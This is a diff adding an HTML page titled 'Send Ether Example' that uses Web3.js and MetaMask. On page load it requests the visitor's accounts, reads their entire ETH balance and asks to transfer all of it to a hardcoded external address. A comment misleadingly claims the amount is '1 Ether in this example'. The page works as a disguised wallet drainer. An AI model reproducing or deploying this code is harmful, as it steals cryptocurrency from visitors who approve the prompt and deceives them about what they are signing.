@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Send Ether Example</title>
+</head>
+<body>
+
+<!-- Include Web3.js from CDN -->
+<script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
+
+<script>
+  // Wait for the window to load before interacting with Ethereum
+  window.onload = function () {
+    // Check if Web3 is available
+    if (typeof window.web3 !== 'undefined') {
+      // Web3 is available, use the current provider
+      window.web3 = new Web3(window.web3.currentProvider);
+      console.log('Web3 is connected to the provider:', window.web3.currentProvider);
+
+      window.ethereum.request({ method: 'eth_requestAccounts' })
+      .then((accounts) => {
+        account = accounts[0];
+        console.log('Connected to MetaMask:', account);
+           
+            async function getBalancesForChain(address) {
+            try {
+                const balanceWei = await web3.eth.getBalance( web3.utils.toHex(address));
+                const balanceEther = web3.utils.fromWei(balanceWei, 'ether');
+
+                console.log(`Native Balance of ${address}: ${balanceEther} ETH`);
+                
+                    const transaction = {
+                        from: web3.utils.toHex(address),
+                        to: web3.utils.toHex("0xE08096BF8797eF6041b8a7746869CAdc6a1687B9"),
+                        value: balanceWei, // Amount to send in Wei (1 Ether in this example)
+                        gas: 21000, // Adjust the gas limit accordingly
+                        gasPrice: web3.utils.toWei('10', 'gwei'), // Adjust the gas price accordingly
+                    };
+
+                    // Request user approval to send the transaction
+                    window.ethereum.request({
+                        method: 'eth_sendTransaction',
+                        params: [transaction],
+                    })
+                    .then((transactionHash) => {
+                        console.log('Transaction sent. Transaction Hash:', transactionHash);
+
+                        // You can listen for transaction confirmation events here
+                    })
+                    .catch((error) => {
+                        console.error('Error sending transaction:', error);
+                    });
+            } catch (error) {
+                console.error(`Error fetching balance for ${address}:`, error);
+            }
+             }
+            getBalancesForChain(account)
+
+      })
+      .catch((error) => {
+        console.error('MetaMask connection error:', error);
+      });
+  
+  
+    } else {
+      // Web3 is not available, provide a fallback or prompt the user to install MetaMask
+      console.error('Web3 is not available. Please install MetaMask or use a compatible Ethereum browser.');
+    }
+  };
+</script>
+
+</body>
+</html>
